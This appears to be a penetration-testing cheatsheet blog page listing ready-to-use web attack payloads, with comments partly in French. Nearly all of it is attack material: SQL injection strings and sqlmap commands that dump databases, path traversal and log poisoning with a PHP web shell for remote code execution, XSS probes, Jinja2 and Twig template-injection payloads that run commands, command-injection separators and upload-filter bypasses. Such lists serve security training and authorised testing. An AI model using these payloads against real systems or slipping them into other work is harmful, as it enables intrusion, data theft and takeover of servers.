---
title: "Common Web Attacks Cheatsheet"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "' OR 1=1-- ' OR 1=1-- ' OR '1'='1 admin'-- ' UNION SELECT 1,2,3-- ' UNION SELECT null,table_name,null FROM information_schema.tables--"
summary: "WebAttacks | Common Web Attacks Cheatsheet"
tags:
  - "Web"
  - "OWASP"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "WebAttacks"
ShowToc: true
TocOpen: false
---

## SQL Injection
```bash
# Detection
' OR 1=1--
" OR 1=1--
' OR '1'='1
admin'--

# Union based
' UNION SELECT 1,2,3--
' UNION SELECT null,table_name,null FROM information_schema.tables--
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--

# SQLMap
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -u "http://<IP>/page?id=1" -D <db> --tables
sqlmap -u "http://<IP>/page?id=1" -D <db> -T <table> --dump
sqlmap -r request.txt --batch    # Depuis fichier Burp
```

## LFI / RFI
```bash
# LFI classique
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd

# LFI to RCE via log poisoning
# 1. Injecter dans User-Agent: <?php system($_GET['cmd']); ?>
# 2. Inclure /var/log/apache2/access.log?cmd=id

# PHP Wrappers
php://filter/convert.base64-encode/resource=index.php
php://input  (POST data = code PHP)
data://text/plain,<?php system('id')?>
```

## XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
' onmouseover='alert(1)
```

## SSTI (Server Side Template Injection)
```bash
# Detection
{{7*7}}  →  49
${7*7}   →  49

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## Command Injection
```bash
; id
| id
$(id)
`id`
&& id
|| id
```

## File Upload
```bash
# Bypass extension
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php.png (double extension)

# Bypass content-type
Content-Type: image/jpeg  (avec contenu PHP)
```
